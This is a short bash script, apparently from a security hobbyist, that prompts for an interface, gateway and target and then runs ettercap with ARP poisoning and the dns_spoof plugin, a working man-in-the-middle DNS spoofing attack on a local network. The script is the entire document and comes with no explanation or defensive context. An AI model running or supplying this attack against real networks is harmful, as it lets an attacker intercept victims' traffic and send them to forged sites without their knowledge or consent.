#!/usr/bin/bash
# nu11secur1ty
# Based on Ettercap
echo "Give an Interface\n";
read interface
        echo "Give an gateway\n";
        read gateway
                echo "Give an Target\n";
                read target
ettercap -T -Q -i $interface -P dns_spoof -M arp /$gateway/ /$target/
#xterm -e ettercap -T -Q -i $interface -P dns_spoof -M arp /$gateway/ /$target/
exit 0;
